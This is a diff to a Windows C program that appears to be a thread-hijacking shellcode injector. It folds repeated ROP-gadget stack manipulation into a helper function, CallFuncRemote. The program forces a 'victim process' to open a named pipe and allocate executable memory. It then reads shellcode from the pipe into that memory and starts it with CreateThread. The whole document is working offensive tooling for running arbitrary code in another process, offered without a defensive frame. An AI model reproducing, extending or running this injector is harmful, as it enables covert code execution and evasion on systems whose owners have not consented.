@@ -1,6 +1,7 @@
 #include <Windows.h>
 
 #include <stdio.h>
+#include <stdint.h>
 
 #define ArraySize(x) (sizeof x / sizeof x[0])
 
@@ -185,7 +186,7 @@ DWORD64 get_ret_val(HANDLE hThread, Gadgets gadgets) {
     //return addr;
 }
 
-void __stdcall TestFunc(DWORD64 a, DWORD64 b, DWORD64 c, DWORD64 d, DWORD64 e, DWORD64 f, DWORD64 g) {
+void TestFunc(DWORD64 a, DWORD64 b, DWORD64 c, DWORD64 d, DWORD64 e, DWORD64 f, DWORD64 g) {
     printf("a: %llu\n", a);
     printf("b: %llu\n", b);
     printf("c: %llu\n", c);
@@ -204,6 +205,47 @@ DWORD WINAPI ThreadFunc(LPVOID lpParam) {
         Sleep(100);
     }
     return 0;
+}
+
+DWORD64 CallFuncRemote(HANDLE hThread, Gadgets gadgets, void* funcAddr, BOOL alignStack, BOOL returnVal, const uint64_t count, const DWORD64 parameters[]) {
+
+    // 1. Check/Fix Stack
+    if (alignStack) {
+        pushm(hThread, gadgets, 0x00);
+    }
+
+    // 2. PUSH function parameters
+    for (uint64_t i = count; i > 4; i--) {
+        pushm(hThread, gadgets, parameters[i-1]);
+    }
+
+    // 3. PUSH shadow space if required
+    if (count > 4) {
+        pushm(hThread, gadgets, 0x00);
+        pushm(hThread, gadgets, 0x00);
+        pushm(hThread, gadgets, 0x00);
+        pushm(hThread, gadgets, 0x00);
+    }
+
+    // 4. PUSH jmps save return pointer
+    pushm(hThread, gadgets, gadgets.jmps);
+
+    // 5. PUSH function to call address
+    pushm(hThread, gadgets, funcAddr);
+
+    // 6. Execute with ret gadget
+    slay(hThread, gadgets, 
+        (count > 0 ? parameters[0] : 0),
+        (count > 1 ? parameters[1] : 0),
+        (count > 2 ? parameters[2] : 0),
+        (count > 3 ? parameters[3] : 0)
+    );
+
+    // 7. Ensure the thread _did_ something
+    waitunblock(hThread);
+
+    // 8. Get return value if required
+    return (returnVal ? get_ret_val(hThread, gadgets) : 0);
 }
 
 int main(void) {
@@ -268,165 +310,45 @@ int main(void) {
     DWORD64 fnCloseHandle  = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"),   "CloseHandle");
     DWORD64 fnReadFile     = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"),   "ReadFile");
 
-    DWORD_PTR namptr = NULL;
+    DWORD64 namptr = 0;
     for (int j = ArraySize(pipename); j > 0; j -= 8) {
         DWORD64 num = *(DWORD64*)(pipename + j - 8);
         namptr = pushm(hThread, gadgets, num);
     }
     printf("[*] Pipe name injected to stack\n");
 
-
-    // This is an exam of calling a function with 8 paramanters correctly that uses stack shadow space. 
-    // https://retroscience.net/x64-assembly.html
-
-    pushm(hThread, gadgets, 8); // some junk for stack alignment
-
-    pushm(hThread, gadgets, 7); //e
-    pushm(hThread, gadgets, 6); //f
-    pushm(hThread, gadgets, 5); //g
-
-    pushm(hThread, gadgets, 0xFFFA);
-    pushm(hThread, gadgets, 0xFFFB);
-    pushm(hThread, gadgets, 0xFFFC);
-    pushm(hThread, gadgets, 0xFFFD);
-
-    pushm(hThread, gadgets, gadgets.jmps);
-
-    pushm(hThread, gadgets, TestFunc);
-
-    slay(hThread, gadgets, 1, 2, 3, 4);
-    waitunblock(hThread);
-    
-
-    // Connect victim process to pipe
-    pushm(hThread, gadgets, 0);
-    pushm(hThread, gadgets, FILE_ATTRIBUTE_NORMAL);
-    pushm(hThread, gadgets, OPEN_EXISTING);
-
-    pushm(hThread, gadgets, 0x02);
-    pushm(hThread, gadgets, 0x01);
-    pushm(hThread, gadgets, 0xA1188FF220);
-    pushm(hThread, gadgets, 0xB8);
-    
-    pushm(hThread, gadgets, gadgets.jmps);
-
-    pushm(hThread, gadgets, fnCreateFileA);
-
-    slay(hThread, gadgets, namptr, GENERIC_READ, FILE_SHARE_READ, 0);
-    waitunblock(hThread);
-
-    HANDLE phand = (HANDLE)get_ret_val(hThread, gadgets); //HANDLE object in victim process
-    printf("Pipes connected\n");
+    // CreateFileA
+    HANDLE phand = (HANDLE)CallFuncRemote(hThread, gadgets, fnCreateFileA, TRUE, TRUE, 7, (DWORD64[]) { namptr, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0});
     if (phand == INVALID_HANDLE_VALUE) {
-        printf("Got a bad handle\n");
+        printf("[!] CreateFileA returned a bad HANDLE\n");
         return 1;
     }
 
-    
-
     // VirtualAlloc
-    // Fix Stack Alignment
-    pushm(hThread, gadgets, 0x69);
-
-
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, fnVirtualAlloc);
-    slay(hThread, gadgets, 0, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-    waitunblock(hThread);
-    DWORD64 addr = get_ret_val(hThread, gadgets);
+    DWORD64 addr = CallFuncRemote(hThread, gadgets, fnVirtualAlloc, TRUE, TRUE, 4, (DWORD64[]) { 0, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE });
+    if (!addr) {
+        printf("[*] VirtualAlloc Failed\n");
+        return 1;
+    }
     printf("[*] VirtualAlloc'd memory at: 0x%llu\n", addr);
 
-
-    //connect victim process to pipe
-
-    //HANDLE test = CreateFileA(namptr, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
-
-    //pushm(hThread, gadgets, 0);
-    //pushm(hThread, gadgets, FILE_ATTRIBUTE_NORMAL);
-    //pushm(hThread, gadgets, OPEN_EXISTING);
-
-    //pushm(hThread, gadgets, gadgets.jmps);
-
-    // Shadow space - just any 32 bytes
-    //pushm(hThread, gadgets, gadgets.jmps);
-    //pushm(hThread, gadgets, gadgets.jmps);
-    //pushm(hThread, gadgets, gadgets.jmps);
-    //pushm(hThread, gadgets, gadgets.jmps);
-
-    //pushm(hThread, gadgets, fnCreateFileA);
-
-    //slay(hThread, gadgets, namptr, GENERIC_READ, FILE_SHARE_READ, 0);
-    //waitunblock(hThread);
-
-    //HANDLE phand = (HANDLE)get_ret_val(hThread, gadgets); //HANDLE object in victim process
-    //printf("Pipes connected\n");
-    //if (phand == INVALID_HANDLE_VALUE) {
-    //    printf("Got a bad handle\n");
-    //    return 1;
-    //}
-    
-
-
-
-
-    // VirtualAlloc
-    //pushm(hThread, gadgets, gadgets.jmps);
-    //pushm(hThread, gadgets, fnVirtualAlloc);
-    //slay(hThread, gadgets, 0, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-    //waitunblock(hThread);
-    //DWORD64 addr = get_ret_val(hThread, gadgets);
-    //printf("[*] VirtualAlloc'd memory at: 0x%llu\n", addr);
-
+    // Write Shellcode
     DWORD bw = 0;
     WriteFile(pipe, buf, sizeof(buf), &bw, NULL);
 
     // ReadFile
-    pushm(hThread, gadgets, 0);
-
-    // Shadow space - just any 32 bytes
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, gadgets.jmps);
-
-    pushm(hThread, gadgets, gadgets.jmps);
-
-    pushm(hThread, gadgets, fnReadFile);
-
-    slay(hThread, gadgets, phand, addr, HeapAllocSize, namptr);
-    waitunblock(hThread);
+    CallFuncRemote(hThread, gadgets, fnReadFile, FALSE, FALSE, 5, (DWORD64[]) { phand, addr, HeapAllocSize, namptr, 0 });
     printf("[*] ReadFile called\n");
 
 
     // CloseHandle
-
-    pushm(hThread, gadgets, 0); // fix stack alignment
-
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, fnCloseHandle);
-    slay(hThread, gadgets, phand, 0, 0, 0);
-    waitunblock(hThread);
+    CallFuncRemote(hThread, gadgets, fnCloseHandle, TRUE, FALSE, 1, (DWORD64[]) { phand });
     printf("[*] CloseHandle called\n");
 
+
     // CreateThread
-    pushm(hThread, gadgets, 0);
-
-
-    // Shadow space - just any 32 bytes
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, gadgets.jmps);
-
-    pushm(hThread, gadgets, gadgets.jmps);
-    pushm(hThread, gadgets, fnCreateThread);
-
-    slay(hThread, gadgets, 0, 0, addr, 0);
-    waitunblock(hThread);
+    CallFuncRemote(hThread, gadgets, fnCreateThread, TRUE, FALSE, 6, (DWORD64[]) { 0, 0, addr, 0, 0, 0 });
     printf("[*] CreateThread called\n");
-
 
     WaitForSingleObject(hThread, INFINITE);
     return 0;
